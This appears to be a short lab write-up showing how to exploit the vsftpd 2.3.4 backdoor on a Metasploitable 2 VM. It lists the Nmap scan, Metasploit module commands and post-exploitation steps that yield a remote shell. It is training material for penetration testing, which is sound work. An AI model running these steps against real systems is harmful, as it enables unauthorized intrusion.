# Vulnerability Assessment & Exploitation of FTP Service using Metasploit

 Project Overview
This project demonstrates how to discover and exploit a vulnerable FTP service on a target machine (Metasploitable 2) using the **Metasploit Framework**.  
The lab showcases a real-world pentesting workflow: scanning → vulnerability assessment → exploitation → post-exploitation.

 **Disclaimer**: Performed only in a safe lab environment. Do NOT attempt on unauthorized systems.

---

 Lab Environment
- **Attacker Machine**: Kali Linux (Metasploit Framework installed)  
- **Target Machine**: Metasploitable 2 (vulnerable VM)  
- **Service in Scope**: FTP (vsftpd 2.3.4)  

---

##  Step 1: Vulnerability Assessment
1. Scan FTP service with Nmap:
   ```bash
   nmap -sV -p 21 <TARGET_IP>

Step 2: Exploitation using Metasploit

Launch Metasploit:

msfconsole


Search & load exploit:

search vsftpd
use exploit/unix/ftp/vsftpd_234_backdoor


Set target:

set RHOST <TARGET_IP>


Run exploit:

exploit


✅ Result: Meterpreter session opened.

 Step 3: Post Exploitation

Check system info:

sysinfo

Get current user:

getuid

List files:

ls

Proof of concept: created /tmp/hacked.txt.

Results

Vulnerable FTP service identified and confirmed.

Exploited successfully with Metasploit → remote shell access gained.

Demonstrated complete pentesting cycle.
